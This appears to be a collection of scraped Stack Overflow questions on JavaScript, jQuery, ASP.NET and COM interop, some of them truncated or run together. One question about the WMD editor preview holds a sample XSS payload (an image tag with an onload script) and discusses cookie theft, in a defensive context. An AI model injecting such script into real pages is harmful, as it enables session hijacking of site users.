Triple Quotes?  How do I delimit a databound Javascript string parameter in ASP.NET?," How do I delimit a Javascript data-bound string parameter in an anchor OnClick event?I have an anchor tag in an ASP.NET Repeater control.The OnClick event of the anchor contains a call to a Javascript function.The Javascript function takes a string for its input parameter.The string parameter is populated with a data-bound value from the Repeater.I need the ""double quotes"" for the Container.DataItem.I need the 'single quotes' for the OnClick.And I still need one more delimiter (triple quotes?) for the input string parameter of the Javascript function call.Since I can't use 'single quotes' again, how do I ensure the Javascript function knows the input parameter is a string and not an integer?Without the extra quotes around the input string parameter, the Javascript function thinks I'm passing in an integer.The anchor: And there is my Javascript: <code>  <a id=""aShowHide"" onclick='ToggleDisplay(<%# DataBinder.Eval(Container.DataItem, ""JobCode"") %>);' >Show/Hide</a> <script language=""JavaScript"" type=""text/javascript"">/* Shows/Hides the Jobs Div */function ToggleDisplay(jobCode){ /* Each div has its ID set dynamically ('d' plus the JobCode) */ var elem = document.getElementById('d' + jobCode); if (elem) { if (elem.style.display != 'block') { elem.style.display = 'block'; elem.style.visibility = 'visible'; } else { elem.style.display = 'none'; elem.style.visibility = 'hidden'; } }}</script>",Triple Quotes?

Copying string values in Javascript closure?," I'm working with a bit of html and Javascript code that I've taken over from someone else. The page reloads a table of data (via an asynchronous request) every ten seconds, and then re-builds the table using some DOM code. The code in question looks something like this: When the onchange event is fired for a <select> element however, it seems like the same values are being passed to the onStatusChanged() method for every <select> in the table (I've verified that in each iteration of the loop, callid and anotherid are being given new, distinct values). I suspect this is occuring because of the nature of how I am setting the event handler, with the select.onchange = function() syntax. If I understand how this is working correctly, this syntax sets a closure for the onchange event to be a function which refers to these two references, which end up having a final value of whatever they are set to on the last iteration of the loop. When the event fires, the value referenced by callid and anotherid is the value set in the last iteration, not the value set at the individual iteration.Is there a way that I can copy the value of the parameters I am passing to onStatusChanged()?I've changed the title to better reflect the question and the accepted answer. <code>  var blah = xmlres.getElementsByTagName('blah');for(var i = 0; i < blah.length; i++) { var td = document.createElement('td'); var select = document.createElement('select'); select.setAttribute(""..."", ""...""); select.onchange = function() { onStatusChanged(select, callid, anotherid); }; td.appendChild(select);}",Event handlers inside a Javascript loop - need a closure?

How do I use the new operator with apply in JavaScript?," Is this possible? I am creating a single base factory function to drive factories of different types (but have some similarities) and I want to be able to pass arguments as an array to the base factory which then possibly creates an instance of a new object populating the arguments of the constructor of the relevant class via an array. In JavaScript it's possible to use an array to call a function with multiple arguments by using the apply method: It doesn't seem as if there's anyway to create an instance of an object using apply though, is there?Something like (this doesn't work): <code>  namespace.myFunc = function(arg1, arg2) { //do something; }var result = namespace.myFunc(""arg1"",""arg2"");//this is the same as above:var r = [ ""arg1"",""arg2"" ];var result = myFunc.apply(namespace, r); var instance = new MyClass.apply(namespace, r);","How can I construct an object using an array of values for parameters, rather than listing them out, in JavaScript?"

How to remove all Click event handlers in Jquery," I'm having a problem. Basically, when a user clicks an 'Edit' link on a page, the following Jquery code runs: By doing this, the onClick event of the save button calls the saveQuestion() method and passes on the ID of the question for which the 'Edit' link was clicked.But if in the same session the user clicks edit on 2 questions, then instead of overwriting the previous click event handler, it instead causes 2 event handlers to run, one which might call saveQuestion(1) and the other might call saveQuestion(2). By doing this 1 question overwrites the other.Is there a way to remove all previous click events that have been assigned to a button? <code>  $(""#saveBtn"").click(function () { saveQuestion(id);});",How to remove all click event handlers using jQuery?

Is it bad practice to return partial views that include javascript?," I am implementing a customer database which lets me search for users and companies, browse and edit their details, and many other things using ASP.NET MVC and javascript (jQuery).Whenever a post or get occurs, I do that via jQuery.load and insert the PartialView into the DOM. Some partial views include forms. I want those to be ajax forms as well, so those partialviews have document.ready handlers that turn the forms into ajax forms (via jquery.form). At the beginning I was handling this in the callback / code that inserts the partial view into the DOM. However, this resulted in one big script containing lots of javascript functions that refer to different pages. I refactored the big javascript by inserting the scripts into the respective pages. Now the code is sleeker (I have much less OnXXXPartialView handlers) and the code is neatly inside the partial view it belongs to. Most of those files only include 3-4 lines of javascript code, so the overhead is not really significant. So effectively I am not only adding elements to the document DOM, but sometimes I am also adding a piece of javascript. In practice this works fine, but it seems Firebug can't debug the dynamically loaded scripts. There are ofcourse workarounds the Firebug issue, but I am wondering whether my architecture may be the real culprit here. Where do you put javascript that belongs to partial views? Is there any best practice? <code> ",Is it bad practice to return partial views that contain javascript?

What's the correct way to test for existence of an attribute on a JavaScript Object?," I have a custom Javascript object that I create with new, and assign properties to based on creation arguments: What's the correct way to test for the existence of the prop property of the objects?

They way I see it, those two languages are very similar.There are obvious differences, likesyntaxproblem domainlibrariestypes (a bit)but which are the more subtle ones? Is there anything a JavaScript coder would take for granted that works in Lua just slightly different? Are there any pitfalls that may not be obvious to the experienced coder of one language trying the other one?For example: in Lua, arrays and hashes are not separate (there are only tables) - in JavaScript, they are numerical Arrays and hashed Objects. Well, this is one of the more obvious differences.But are there differences in variable scope, immutability or something like this? <code> ",subtle differences between JavaScript and Lua

Detect when browser receives file download," I have a page that allows the user to download a dynamically-generated file. It takes a long time to generate, so I'd like to show a ""waiting"" indicator. The problem is, I can't figure out how to detect when the browser has received the file so that I can hide the indicator.I'm requesting a hidden form, which POSTs to the server, and targets a hidden iframe for its results. This is, so I don't replace the entire browser window with the result. I listen for a ""load"" event on the iframe, hoping that it will fire when the download is complete.I return a ""Content-Disposition: attachment"" header with the file, which causes the browser to show the ""Save"" dialog. But the browser doesn't fire a ""load"" event in the iframe.One approach I tried is using a multi-part response. So it would send an empty HTML file, as well as the attached downloadable file.For example: This works in Firefox; it receives the empty HTML file, fires the ""load"" event, and then shows the ""Save"" dialog for the downloadable file. But it fails on InternetExplorer and Safari; InternetExplorer fires the ""load"" event, but it doesn't download the file, and Safari downloads the file (with the wrong name and content-type) and doesn't fire the ""load"" event.A different approach might be to call to start the file creation, poll the server until it's ready, and then download the already-created file. But I'd rather avoid creating temporary files on the server.What should I do? <code>  Content-type: multipart/x-mixed-replace;boundary=""abcde""--abcdeContent-type: text/html--abcdeContent-type: application/vnd.fdfContent-Disposition: attachment; filename=foo.fdffile-content--abcde",Detect when a browser receives a file download

Javascript: Visibility error in IE when setting focus on an input element," This may be the most obscure bug I have yet encountered in many years of working with JavaScript and any version of Internet Explorer. We're using YUI 2.7 for some of the (non)convenience methods. Sigh, what I would do for jQuery....This is affecting Internet Explorer 6 and Internet Explorer7. Internet Explorer 8 behaves properly. All other browsers also behave properly.Problem: When I set focus on a particular element, I get the following error: So I have a div called 'add-comment-login-overlay' that contains the input element. This div is display:none until the user clicks one of several links called 'login'.The following is the JavaScript code I'm using that selects the 'login' links, which moves the position of the 'add-comment-login-overlay' in the DOM, sets display:block, then sets focus on the 1st input field in the overlay. It's this process of setting focus that is causing the error I wrote above. I can absolutely confirm that the overlay div is completely visible. I can look at it. I have added a setInterval timer to measure what's happening and it has no effect. At one point I had 10 seconds going between the time the overlay was visible and when focus() was called and the error still occurs. Other than the error, the form is completely functional other than this error.This is a simplified version of the overlay HTML code as a reference. <code>  Can't move focus to the control because it is invisible, not enabled, or of a type that does not accept focus. //Get Login links in comment forms.links = YAHOO.util.Dom.getElementsByClassName('addCommentLoginLink');//Set click event for login links.YAHOO.util.Event.addListener(links, ""click"", function(el){ //Stop link.

Microsoft's AJAX Toolkit vs. Ajax," Our team has been using Microsoft's AJAX Toolkit since the days of Atlas. In a bit of naivety we missed the jQuery/Prototype phenomenon until a month or two back. Until now, we have always associated the concept of Ajax with Microsoft's toolkit.In reading up on jQuery I'm seeing a whole new side of Ajax that I was only vaguely aware of. That is, you can use JavaScript (or a JS library) to talk to the server without using a specialized control. At first glance, it seems like this offers better browser compatibility and less bloat. I'm certainly interested in it.My question to the community:When working with ASP.NET and faced with the need to communicate with the server without a postback, how does one make the determination to use a control from the AJAX Toolkit instead of working with something like jQuery? Is there a reason to use both? <code> ",Microsoft's AJAX Toolkit vs. jQuery

How can I swap or remove jQuery validators from a page?," Note:This question refers to a very old version of jQuery.validate() (version 1.5). This plugin now provides a built-in solution for doing this: the .rules() method that should be used instead. I'm leaving this question and answer in its original form for historical purposes for anyone who needs to maintain a legacy site that is unable to upgrade to the latest versions of jQuery and jQuery.validate().I have a form that toggles what input elements are visible. I want to validate only the visible elements on the form. I'm having a hard time getting this to function correctly. I want to disable validators for non-visible elements and I can't seem to figure out the best way to do this. Any insight to what may be wrong with my code, or my approach would be appreciated.When visibility is toggled, I've tried a few things:Calling $(""form"").rules(""remove"") to clear all existing validation rules. This throws an ""undefined"" JavaScript exception.Calling $(""form"").validation(...options...) for the visible elements, hoping this would overwrite the rules. This only allows the first group that is validated to work. The second panel can not be validated.Unbinding the submit handler before calling the new validation() method. This didn't do what I would have thought. It removes all validation (seemingly) permanently and the form submits without validation.Clearing out the validation object with $.removeData($('form'), 'validator') before trying to call the validator again. This also doesn't work.This is in an ASP.NET site, so using multiple <form /> tags is out of the question since that would break the page.I'm sort of stumped on how I can make this work. You can see a complete working demo of what I have at http://jsbin.com/ucibe3, or edit it at http://jsbin.com/ucibe3/edit. I've tried to strip it down to just the code that causes the bug.Here are the key pieces of my code (use above links for complete working page)HTML: JavaScript: <code>  <td id=""leftform""> Left Form<br /> Input 1: <input type=""text"" name=""leftform_input1"" /><br /> Input 2: <input type=""text"" name=""leftform_input2"" /><br /> <input type=""submit"" name=""leftform_submit"" value=""Submit Left"" /></td><td id=""rightform"" style=""visibility:hidden""> Right Form<br /> Input 1: <input type=""text"" name=""rightform_input1"" /><br /> Input 2: <input type=""text"" name=""rightform_input2"" /><br /> <input type=""submit"" name=""rightform_submit"" value=""Submit Right"" /></td> $('#toggleSwitch').click(function() { if ($('#leftform').css(""visibility"") !== ""hidden"") { $('#leftform').css(""visibility"", ""hidden""); $('#rightform').css(""visibility"", ""visible""); $('form').validate({ rules: { rightform_input1: { required: true }, rightform_input2: { required: true } }, messages: { rightform_input1: ""Field is required"", rightform_input2: ""Field is required"" } }); } else { $('#rightform').css(""visibility"", ""hidden""); $('#leftform').css(""visibility"", ""visible""); $('form').validate({ rules: { leftform_input1: { required: true }, leftform_input2: { required: true } }, messages: { leftform_input1: ""Field is required"", leftform_input2: ""Field is required"" } }); }});","How can I add, remove, or swap jQuery validation rules from a page?"

What's the best way to truncate text to fit in a container?," I have some dynamic text contained in a div that is set to whatever a user enters in a textbox field. If the text doesn't fit in the div, right now it just gets cut off at the edge and all the text that extends past the border is not visible. I would like to truncate the text so that it fits inside the box and has an ellipsis (...) appended on the end. For example: Obviously in the example it's easy because the code tag uses a fixed-width font so it's as simple as counting characters. I have a variable-width font so if they enter ""WWWWWWWWWWW"" it will fill up in much fewer characters than ""................"" would. What's the best way to do this? I found a potential solution for simply finding the actual pixel width of the text here: http://www.codingforums.com/archive/index.php/t-100367.html But even with a method like that, it's a bit awkward to implement the ellipsis. So if it's 20 characters and I find that it doesn't fit, I would have to truncate to 19, add the ellipsis, and then check if it fits again. Then truncate to 18 (plus the ellipsis) and try again. And again. And again...until it fit. Is there a better way?EDIT: I have decided based on the answers that my original approach is best, except I have tried to improve on the solution in the link above by not creating a separate td element simply for measuring, which feels like a hack.Here is my code: And styles: and the javascript that trims and adds the ellipsis: The ""line1"" and ""line2"" divs get passed to the function. It works in the case of a single word input like ""WWWWWWWWWWWWWWWWW"" but does not work a multi-word input ""WWWWW WWWWW WWWWW"" because it just adds line breaks and measures the text as being the width of ""WWWWW"". Is there a way I can fix this without resorting to copying the text into a hidden measuring element? Some way to set the style of the line divs so that they don't wrap text? <code>  |----div width------| Here is some sample text that is too long. Here is some sam... <div id=""tab"" class=""tab""> <div id=""tabTitle"" class=""tabTitle""> <div class=""line1"">user-supplied text will be put here</div> <div class=""line2"">more user-supplied text will be put here</div> </div></div> .tab {padding: 10px 5px 0px 10px;margin-right: 1px;float: left;width: 136px;height: 49px;background-image: url(../images/example.gif);background-position: left top;background-repeat: no-repeat;} .tab .tabTitle { height: 30px;width: 122px; overflow: hidden; text-overflow: ellipsis;font-size: 12px;font-weight: bold;color: #8B8B8B;}.tab .tabTitle .line1, .tab .tabTitle .line2 { display:inline; width:auto;} function addOverflowEllipsis( containerElement, maxWidth ){ var contents = containerElement.innerHTML; var pixelWidth = containerElement.offsetWidth; if(pixelWidth > maxWidth) { contents = contents + """"; // ellipsis character, not ""..."" but """" } while(pixelWidth > maxWidth) { contents = contents.substring(0,(contents.length - 2)) + """"; containerElement.innerHTML = contents; pixelWidth = containerElement.offsetWidth; }}",How can I mimic text-overflow: ellipsis in Firefox?
Javascript - Dom Reflow," Could someone prove to me that the advice given here (copied below) regarding removing dom elements before altering them and then re-inserting them is ever quicker. By prove, I would like to see some figures. Its great that they research this but I think the article is very weak without including specifics as to what the 'problem' actually is and how the solution fixes is in terms of speed (as the article title Speeding up JavaScript)The article....Out-of-the-flow DOM ManipulationThis pattern lets us create multiple elements and insert them into the DOM triggering a single reflow. It uses something called a DocumentFragment. We create a DocumentFragment outside of the DOM (so it is out-of-the-flow). We then create and add multiple elements to this. Finally, we move all elements in the DocumentFragment to the DOM but trigger a single reflow.The problemLet's make a function that changes the className attribute for all anchors within an element. We could do this by simply iterating through each anchor and updating their href attributes. The problems is, this can cause a reflow for each anchor. The solutionTo solve this problem, we can remove the element from the DOM, update all anchors, and then insert the element back where it was. To help achieve this, we can write a reusable function that not only removes an element from the DOM, but also returns a function that will insert the element back into its original position. Now we can use this function to update the anchors within an element that is out-of-the-flow, and only trigger a reflow when we remove the element and when we insert the element. <code>  function updateAllAnchors(element, anchorClass) { var anchors = element.getElementsByTagName('a'); for (var i = 0, length = anchors.length; i < length; i ++) { anchors[i].className = anchorClass; }} /** * Remove an element and provide a function that inserts it into its original position * @param element {Element} The element to be temporarily removed * @return {Function} A function that inserts the element into its original position **/function removeToInsertLater(element) { var parentNode = element.parentNode; var nextSibling = element.nextSibling; parentNode.removeChild(element); return function() { if (nextSibling) { parentNode.insertBefore(element, nextSibling); } else { parentNode.appendChild(element); } };} function updateAllAnchors(element, anchorClass) { var insertFunction = removeToInsertLater(element); var anchors = element.getElementsByTagName('a'); for (var i = 0, length = anchors.length; i < length; i ++) { anchors[i].className = anchorClass; } insertFunction();}",Javascript Performance - Dom Reflow - Google Article

Versioning CouchDB code," I am new to CouchDB way of making things. So, I have a lot of questions about it, but let's focus in one of them.CouchDB has this concept of javascript code (validation + map-reduce + show + ?) being written in the design documents. This is part of the database, like stored procedures or triggers are for more tradittional databases.Is there anybody maintaining this code inside a project so that we can actually test this code like any other javascript code (through jspec for instance, mocking the dependencies), version in the same repository we version the rest of our code, probably in a separate folder.. is it possible and used? Or isn't it good for some reason I should know?What I would like to have is some way to do a single rake task and my couchdb design documents get synced with the project, something like that might be useful.In the case of ruby, it would be helpful also to make some dynamic magic happen (e.g. default views and validations, new views through the use of named scopes). <code> ",How to manage CouchDB code out of it?
How can I add groups to a validator after its been initialized?," On our site we are using an embedded sign-up form from our ESP that uses the jQuery validate plugin. We are customizing the form a bit, adding a couple of custom fields (first name, last name) and we want them to be grouped so there is only one error message for both the fields.Since the form's validator has already been initialized I need to add in a few things dynamically. The plugin provides the rules( ""add"", rules ) method to add in validation rules dynamically, although we are just using class names to do this anyhow. But there is no clear way to set the groups option after the validator has been initialized.I've tried a few different things to accomplish this, but none some to be working: The errorPlacement function is added to the validator, but not the groups.I've also tried setting the groups option explicitly, but that has no effect either. I'm completely stumped as how to accomplish this. <code>  var settings = $(""#mc-embedded-subscribe-form"").validate().settings;$(""#mc-embedded-subscribe-form"").validate($.extend(settings, { groups: { username: ""FNAME LNAME"" }, errorPlacement: function(error, element) { if (element.attr(""name"") == ""FNAME"" || element.attr(""name"") == ""LNAME"") { error.insertAfter(""#username_group""); } else { error.insertAfter(element); } }})); $(""#mc-embedded-subscribe-form"").validate().settings.groups = { username: ""FNAME LNAME"" };$(""#mc-embedded-subscribe-form"").validate().groups = { username: ""FNAME LNAME"" };",jQuery Validate Plugin: How can I add groups to a validator after its been initialized?

JavaScript nested inheritance," I've been trying to get my head around JavaScript inheritance.Confusingly, there seem to be many different approaches - Crockford presents quite a few of those, but can't quite grok his prose (or perhaps just fail to relate it to my particular scenario).Here's an example of what I have so far: This approach leaves me with a fair amount of redundancy, as I cannot delegate instance-specific attributes to the base class (at the time of prototype assignment, the attribute value is unknown). Thus each subclass has to repeat that attribute.Is there a recommended way to solve this?Bonus question: Is there a reasonable way to avoid the ""new"" operator, or would that be regarded as a newbie working against the language? <code>  // base classvar Item = function( type, name ) { this.type = type; this.name = name; // unused};// actual class (one of many related alternatives)var Book = function( title, author ) { this.name = title; // redundant (base class) this.author = author;};Book.prototype = new Item('book'); // duplication of ""book""// instancesvar book = new Book('Hello World', 'A.

I know that this works the way I want it to. But this doesn't, and only runs once. What I'm I lacking... What is the difference? Any links to the topic would be helpful.My assumption was that the handler should act like the listener but it doesn't. In fact does a listener even need to be added to the addLoadEvent function?  <code>  addLoadEvent(converter);// Converterfunction converter() { var pixels = document.getElementById(""pixels""); pixels.addEventListener(""keyup"", updateNode, true); pixels.addEventListener(""keydown"", updateNode, true);} addLoadEvent(converter);// Converterfunction converter() { var pixels = document.getElementById(""pixels""); pixels.onkeydown = updateNode; pixels.onkeyup = updateNode;}",JavaScript Event Listeners vs Event Handlers

"WebKit ""Refused to set unsafe header ""content-length"""," I am trying to implement simple xhr abstraction, and am getting this warning when trying to set the headers for a POST.

jcarousel not getting drawn inside a hidden div," I am using a div to populate a ul/li list and then draw a jCarousel out of it.So this works fine: Here is the problem:The div containing the ul/li items could be hidden by the click of another button. When the div is hidden, and I re-size the browser window, the jCarousel also attempts to redraw itself, but since it is hidden, it is not able to draw it properly. The result is that everything is jumbled up in the list (if I click the button again to make it visible). But again if I re-size the window now (the jumbled up jCarousel is NOT hidden now), it redraws itself correctly.I tried getting ahold of the jCarousel instance and reload itself as soon as the button is clicked to make the div visible (the way it re-sizes itself when it is visible and window is re-sized). To get the jCarousel, I am using: and it is returned as null.How can I get the jCarousel to draw correctly? <code>  $('#mycarousel').jcarousel(); JQuery('#mycarousel').data('jcarousel') ",jCarousel not getting drawn inside a hidden div

Sanitizing usser input before adding it to the DOM in Javascript," I'm writing the JS for a chat application I'm working on in my free time, and I need to have HTML identifiers that change according to user submitted data. This is usually something conceptually shaky enough that I would not even attempt it, but I don't see myself having much of a choice this time. What I need to do then is to escape the HTML id to make sure it won't allow for XSS or breaking HTML.Here's the code: What would be the best way to escape id to avoid any kind of problem mentioned above? As you can see, right now I'm using the built-in escape() function, but I'm not sure of how good this is supposed to be compared to other alternatives. I'm mostly used to sanitizing input before it goes in a text node, not an id itself. <code>  var user_id = escape(id)var txt = '<div class=""chut"">'+ '<div class=""log"" id=""chut_'+user_id+'""></div>'+ '<textarea id=""chut_'+user_id+'_msg""></textarea>'+ '<label for=""chut_'+user_id+'_to"">To:</label>'+ '<input type=""text"" id=""chut_'+user_id+'_to"" value='+user_id+' readonly=""readonly"" />'+ '<input type=""submit"" id=""chut_'+user_id+'_send"" value=""Message""/>'+ '</div>';",Sanitizing user input before adding it to the DOM in Javascript
Is there a Javascript library for editing PDFs?," Based on my Google and stackoverflow search I'm guessing there are no library for this purpose.The goal is: store some blank forms on my server. Then present these to the user, who edits the form in the browser with Javascript and submits the form back to the server.The client wants to reuse parts of an old system (the forms) in which users would download an editable PDF, edit it, and email it back to a secretary. Our users aren't very computer savvy and many don't realize they need to email the forms back, assuming instead the forms somehow get submitted when they save their local changes (or something).I haven't seen the forms yet, so I cannot assess the viability of an alternative. <code> ",How to edit PDFs in Javascript?

prevent javascript in the WMD editor's preview box," There are many Stack Overflow questions (e.g. Whitelisting, preventing XSS with WMD control in C# and WMD Markdown and server-side) about how to do server-side scrubbing of Markdown produced by the WMD editor to ensure the HTML generated doesn't contain malicious script, like this: But I didn't find a good way to plug the hole on the client side too. Client validation isn't a replacement for scrubbing validation on the server of course, since anyone can pretend to be a client and POST you nasty Markdown. And if you're scrubbing the HTML on the server, an attacker can't save the bad HTML so no one else will be able to see it later and have their cookies stolen or sessions hijacked by the bad script. So there's a valid case to be made that it may not be worth enforcing no-script rules in the WMD preview pane too. But imagine an attacker found a way to get malicious Markdown onto the server (e.g. a compromised feed from another site, or content added before an XSS bug was fixed). Your server-side whitelist applied when translating markdown to HTML would normally prevent that bad Markdown from being shown to users. But if the attacker could get someone to edit the page (e.g. by posting another entry saying the malicious entry had a broken link and asking someone to fix it), then anyone who edits the page gets their cookies hijacked. This is admittedly a corner case, but it still may be worth defending against.Also, it's probably a bad idea to allow the client preview window to allow different HTML than your server will allow. The Stack Overflow team has plugged this hole by making changes to WMD. How did they do it?[NOTE: I already figured this out, but it required some tricky JavaScript debugging, so I'm answering my own question here to help others who may want to do ths same thing]. <code>  <img onload=""alert('haha');"" src=""http://www.google.com/intl/en_ALL/images/srpr/logo1w.png"" />",Align the WMD editor's preview HTML with server-side HTML validation (e.g. no embedded JavaScript code)

Best practice for inserting large chunks of HTML into elements with Javscript?," I'm building a web application (using prototype) that requires the addition of large chunks of HTML into the DOM. Most of these are rows that contain elements with all manner of attributes.Currently I keep a blank row of HTML in a variable and Now that works all well and dandy, but is it the best practice?I have to update the code in the blankRow when I update code on the page, so the new elements being inserted are the same. It gets sucky when I have like 40 lines of HTML to go in a blankRow and then I have to escape it too.Is there an easier way? I was thinking of urlencoding and then decoding it before insertion but that would still mean a blankRow and lots of escaping.What would be mean would be a eof function a la PHP et al. That would mean no escaping but it would still need a blankRow.What do you do in this situation?SOLVEDEnded up using a DOMBuilder in prototype. No other libraries were needed: See my solution here or here. <code>  var blankRow = '<tr><td>' +'<a href=""{LINK}"" onclick=""someFunc(\'{STRING}\');"">{WORD}</a>' +'</td></tr>';function insertRow(o) { newRow = blankRow .sub('{LINK}',o.link) .sub('{STRING}',o.string) .sub('{WORD}',o.word); $('tbodyElem').insert( newRow );} $blankRow = <<<EOFtexttextEOF; $w('a div p span img table thead td th tr tbody tfoot input').each(function(e) { window['$' + e] = function() { return new Element(e, arguments[0]); }});newPart = $div({id: 'partition-4'}) .insert( $p() .insert('<b>Stuff</b>') ) .insert( $p({ id: 'a-p'}) .insert('<b>More stuff</b>') );$('parentDiv').insert(newPart);",Best practice for inserting large chunks of HTML into elements with Javascript?
Javascript code inside updatepanel usercontrol.," Ok: I've got an UpdatePanel on an aspx page that contains a single Placeholder.Inside this placeholder I'm appending one of a selection of usercontrols depending on certain external conditions (this is a configuration page).In each of these usercontrols there is a bindUcEvents() javascript function that binds the various jQuery and javascript events to buttons and validators inside the usercontrol.The issue I'm having is that the usercontrol's javascript is not being recognised. Normally, javascript inside an updatepanel is executed when the updatepanel posts back, however none of this code can be found by the page (I've tried running the function manually via firebug's console, but it tells me it cannot find the function).Does anyone have any suggestions?Cheers, Ed.EDIT:cut down (but functional) example:Markup: C#: You'll see that the button does not poput the alert message, even though the code is present on the page.EDIT2:Ok, just to make it clear, the production code is significantly more complex than just a single function bound onto a literal, and contains a large number of bits of code that'll be very difficult to factor off into non-specific functions, and pointless as they're each only used in one place (we're talking very specific validation and the odd popout trigger + some logic). <code>  <script src=""/js/jquery-1.3.2.min.js""></script> <form id=""form1"" runat=""server""> <div> <asp:ScriptManager ID=""Script"" runat=""server"" /> <asp:Button ID=""Postback"" runat=""server"" Text=""Populate"" OnClick=""PopulatePlaceholder"" /> <asp:UpdatePanel ID=""UpdateMe"" runat=""server""> <Triggers> <asp:AsyncPostBackTrigger ControlID=""Postback"" EventName=""Click"" /> </Triggers> <ContentTemplate> <asp:Literal ID=""Code"" runat=""server"" /> <asp:PlaceHolder ID=""PlaceMe"" runat=""server"" /> </ContentTemplate> </asp:UpdatePanel> </div> </form> protected void PopulatePlaceholder(object sender, EventArgs e){ Button button = new Button(); button.ID = ""Push""; button.Text = ""push""; button.OnClientClick = ""javascript:return false;""; Code.Text = ""<script type=\""text/javascript\""> function bindEvents() { $('#"" + button.ClientID + ""').click(function() { alert('hello'); }); } bindEvents(); </script>""; PlaceMe.Controls.Add(button);} <%= Control.ClientID %>",JavaScript code inside UpdatePanel
jQuery global variable best practice & options?," Currently I am working on a legacy web page that uses a ton of JavaScript, jQuery, Microsoft client JavaScript, and other libraries. The bottom line - I cannot rewrite the entire page from scratch as the business cannot justify it. So... it is what it is. Anyway, I need to pollute (I really tried not too) the global namespace with a variable. There are the three options I was thinking about -Just store/retrieve it using a normal JavaScript declaration - var x = 0;Use jQuery to store/retrieve the value in a DOM tag - $(""body"").data(""x"", 0);Use a hidden form field, and set/retrieve the value with jQuery - $(""whatever"").data(""x"", 0);Is there a better way?

In above examples, delete, backspace, and arrow keys are exceptional.But the feature that I don't want to lose is having not to display the input in the textarea unless it passes the validation. (In case the user try to put illegal characters in the textarea, nothing should appear at all) That is why I am not doing validation upon keyup event.So my question is:Are there better ways to validate input in keydown event than checking keyCode by keyCode?Are there other ways to capture the user inputs other than keydown event before browser displays it? And a way to put the validation on it? <code>  function validateUserInput(){ var code = this.event.keyCode; if ((code<48||code>57) // numerical &&code!==46 //delete &&code!==8 //back space &&code!==37 // <- arrow &&code!==39) // -> arrow { this.event.preventDefault(); }}",Input validation in the keydown event

How to handle large data sets for server-side simulation --> client browser.," Sorry for the somewhat confusing title. Not sure really how to title this. My situation is this- I have an academic simulation tool, that I in the process of developing a web front-end for. While the C++-based simulator is computationally quite efficient (several hundredths to a tenth of a second runtime) for small systems, it can generate a significant (in web app terms) amount of data (~4-6mb).Currently the setup is as follows-User accesses index.html file. This page on the left side has an interactive form where the user can input simulation parameters. On the right side is a representation of the system they are creating, along with some greyed out tabs for various plots of the simulation data.User clicks ""Run simulation."" This submits the requested sim parameters to a runSimulation.php file via an AJAX call. runSimulation.php creates an input file based on the submitted data, then runs the simulator using this input file. The simulator spits out 4-6mb of data in various output files.Once the simulation is done running, the response to the browser is another javascript function which calls a file returnData.php. This php script packages the data in the output files as JSON data, returns the JSON data to the browser, then deletes the data files.This response data is then fed to a few plotting objects in the browser's javascript, and the plot tabs become active. The user can then open and interact with the plotted data.This setup is working OK, however I am running into two issues:The return data is slow- 4-6mb of data coming back can take a while to load. (That data is being gzipped, which reduces its side considerably, but it still can take 20+ seconds on a slower connection)The next goal is to allow the user to plot multiple simulation runs so that they can compare the results.My thought is that I might want to keep the data files on the server, while the users session is active. This would enable the ability to only load up the data for the plot the user wants to view (and perhaps loading other data in the background as they view the results of the current plot). For the multiple runs, I can have multiple data sets sitting on the server, ready for the user to download if/when they are needed.However, I have a big issue with this line of thinking- how do I recognize (in php) that the user has left the server, and delete the data? I don't want the users to take over the drive space on the machine. Any thoughts on best practices for this kind of web app? <code> ",How to handle large data sets for server-side simulation --> client browser

So I use jQuery's delegate to bind the events as follows: This doesn't seem to work and the inline onclick fires anyway. I've tried with live() as well but no success. Is there something I am missing here? <code>  <ul id=""update-list""><li class=""update"" onclick=""window.location('some_url')""> <h2> some header </h2> <p> some paragraph </p> <div> <a class=""popup-link""> <span> Show Popup </span> <span> + </span> </a> </div></li> // this repeats n times//...</ul> $('#update-list').delegate('.popup-link', 'click', function(e){ // e.target is <span> while e.currentTarget is .popup-link e.stopPropagation(); //console.log(e.isPropagationStopped()); this shows 'true' in console $.popup(); // launch popup e.preventDefault(); // or return false});",Stop propagation with jQuery delegate/live function not working

The best way to abstract javascript library?," What would be the best way to abstract away any given JavaScript framework (jQuery, MooTools etc.), that sits on the bottom of the framework stack? Essentially, I would like to have a situation where I could swap out the library, do changes only to one layer of the framework (not to every module, for example), and the whole thing could be up and running again.So, every module should call a framework function(s), which would then be routed to the library. <code> ",The best way to abstract a JavaScript library?
oleautomation-compatible C# COM class unusable from jscript (but OK from vbscript) - why?," Consider the automation-compatible COM library in C#, given below. It follows a common COM pattern of having a visible factory coclass FooFactory implementing ICreateFoos which creates an object of type IFoo. FooFactory is the only coclass in the type library. (The factory pattern is particularly useful with COM, as it does not allow for parameterized constructors).In the code below, I'm finding that I cannot access the returned IFoo interface from jscript unless I make the FooImpl class ComVisible (by uncommenting commented lines; this causes it to appear as a coclass in the type library). There is no such problem accessing this from VBscript.That is, I can run this VBScript: But this functionally identical JScript fails, with the error ""C:\temp\jstest\jstest.js(4, 1) Microsoft JScript runtime error: 'foo' is null or not an object"": If I uncomment the line, I can see that null==foo is false.Why does this happen? Is it a bug? Note that I think this is a problem is a combination of JScript and the C#/.net-specific implementation (possibly of IDispatch), because I have other similar COM servers - implemented in C++ - that do not exhibit this problem from JScript.The problem goes away if I uncomment the commented lines in the code below, making FooImpl visible as a coclass - but I specifically do not want to do this as I don't want to expose implementation details. A workaround seems to be to make FooImpl ComVisible, but mark its constructor internal, which prevents clients from being able to CoCreate it, but that's hardly elegant.I'm running on WinXP SP3 with Visual Studio 2005, .net 2, and have been able to reproduce the issue on a completely fresh install of TinyXP on a VirtualBox (both with Windows Script Host 5.7), and also on Windows 7 Ultimate using .net SDKs 2.0, 3.0, 3.5 and 4.0 (WSH 5.8). All OSes were 32-bit.The library code: You can compile and register (you may have to run as admin to regasm) this with  <code>  set ff = CreateObject(""jstest.FooFactory"")set foo = ff.CreateFoo(0)foo.Foo var ff = new ActiveXObject(""jstest.FooFactory"");var foo = ff.CreateFoo(0)//WScript.Stdout.WriteLine(null==foo)foo.Foo(); using System;using System.Runtime.InteropServices;[assembly: ComVisible(false)]namespace jstest{ [ComVisible(true)] public interface ICreateFoos { IFoo CreateFoo(int importantNumber); } [ComVisible(true)] public interface IFoo { void Foo(); } [ComVisible(true)] public class FooFactory : ICreateFoos { public IFoo CreateFoo(int importantNumber) { // in *this* version, we don't use importantNumber yet return new FooImpl(); } } //[ComVisible(true)] public class FooImpl : IFoo { public void Foo() { Console.WriteLine(""Foo""); } }} csc /target:library jstest.csregasm /codebase jstest.dll",Why is this C# COM class usable from VBScript but not JScript?

